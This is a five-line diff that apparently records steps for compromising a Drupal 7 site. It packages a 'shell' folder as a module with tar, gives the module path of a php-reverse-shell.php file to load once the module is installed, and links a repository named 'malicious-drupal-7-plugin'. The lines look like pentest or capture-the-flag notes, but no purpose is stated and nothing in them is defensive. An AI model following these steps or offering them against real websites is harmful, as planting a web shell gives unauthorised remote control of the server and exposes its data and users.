@@ -1,0 +1,5 @@
+tar -zcvf shell-module.tar.gz shell
+
+http://SITE_ROOT/sites/all/modules/shell/php-reverse-shell.php
+
+link: https://github.com/christopher-pace/malicious-drupal-7-plugin
